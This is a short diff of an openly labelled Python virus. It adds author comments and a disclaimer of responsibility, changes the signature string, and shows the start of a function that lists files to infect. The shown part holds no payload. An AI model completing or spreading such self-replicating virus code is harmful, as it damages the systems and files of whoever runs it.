@@ -1,7 +1,11 @@
 #!/usr/bin/python
+#VoDkAdRiNkErBoI PyThOn ViRuS
+#CrEaTeD By  VoDkAdRiNkErBoI
+#If Any Of This Code Is Used For Malicious Purposes Then I Do Not Accept Responsiblity For Any Damages Caused
+
 import os
 import datetime
-SIGNATURE = "VoDkAdRiNkErBoI Python Virus"
+SIGNATURE = "VoDkAdRiNkErBoI PyThOn ViRuS"
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
